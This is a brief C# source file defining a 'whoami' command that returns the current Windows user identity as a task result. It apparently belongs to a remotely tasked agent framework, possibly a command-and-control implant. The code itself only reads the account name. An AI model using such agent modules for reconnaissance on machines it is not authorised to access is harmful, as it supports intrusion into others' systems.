using Agent.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class WhoamiCommand : AgentCommand
    {
        public override string Name => "whoami";

        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, MessageManager commm)
        {
            var identity = WindowsIdentity.GetCurrent();
            result.Result = identity.Name;
        }
    }
}
